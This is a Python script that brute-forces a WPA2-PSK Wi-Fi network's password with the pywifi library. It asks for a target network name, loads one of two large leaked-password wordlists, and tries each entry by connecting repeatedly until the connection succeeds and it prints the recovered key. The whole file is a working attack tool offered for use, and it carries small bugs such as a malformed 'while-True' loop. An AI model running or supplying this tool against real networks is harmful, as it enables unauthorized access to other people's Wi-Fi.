import argparse
import sys , os , os.path , platform
import re
import time

import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

client_ssid = input("Wifi name: ")
print("1: xato 5 million passwords from 2021")
print("2: openwall.net 3.7 million passwords from 2020")
try:
    pwd_list = int(input("Password list: "))
except:
    print("must be number")
    time.sleep(2)
if pwd_list == 1:
    path_to_file = "passwords/pwd-list.txt"
elif pwd_list == 2:
    path_to_file = "passwords/openwall.net-all.txt"

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"


try: 
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan()
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

except:
    print("[-] Error system")

type = False

def main(ssid, password, number):

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.disconnect()
    iface.remove_network_profile(profile)
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(tmp_profile)
    time.sleep(0.35)

    if ifaces.status() == const.IFACE_CONNECTED:
        #time.sleep(1)
        print(BOLD, GREEN,'[*] Correct password!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        #time.sleep(1)
        while-True:
            time.sleep(50)
    else:
        print(RED, '[{}] Wrong password: {}'.format(number, password))

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)
                    


def menu(client_ssid,path_to_file):
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    print()

    args = parser.parse_args()

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file 

 
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE,"[~] Starting...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)


menu(client_ssid , path_to_file)
